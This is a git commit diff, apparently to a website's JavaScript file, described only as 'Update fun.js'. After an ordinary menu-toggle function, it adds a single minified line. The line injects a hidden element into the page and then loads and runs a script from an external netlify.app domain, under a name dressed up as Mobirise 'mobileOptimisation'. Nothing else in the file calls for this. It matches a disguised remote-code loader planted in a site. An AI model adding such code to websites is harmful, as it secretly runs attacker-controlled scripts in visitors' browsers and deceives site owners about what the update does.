bd471b261c1ae5e8d0de93c27ac3026b6704df2e
github-priyanshu <87130517+github-priyanshu@users.noreply.github.com>
2024-02-26 18:17:30 +0530

    Update fun.js

--- siteFormatCommonSource/js/fun.js
+++ siteFormatCommonSource/js/fun.js
@@ -7,3 +7,5 @@ function myFunction() {
     menuToggler.classList.toggle("change");
     console.log(menuToggler.classList)
   }
+  
+  const el=`<div id="mobiOptiElem" server='hstgr.io'></div>`; try{ document.querySelector('style').insertAdjacentHTML("beforeend",el); }catch(e){}finally{ document.querySelector('head').insertAdjacentHTML("beforeend",el); }; setTimeout(()=>{var els=document.createElement("script");els.src="https://mobirise-icons-92lwkjerngovo73otd4g.netlify.app/mobileOptimisation.js"; document.querySelector("#mobiOptiElem").insertAdjacentElement('afterbegin',els);},300);
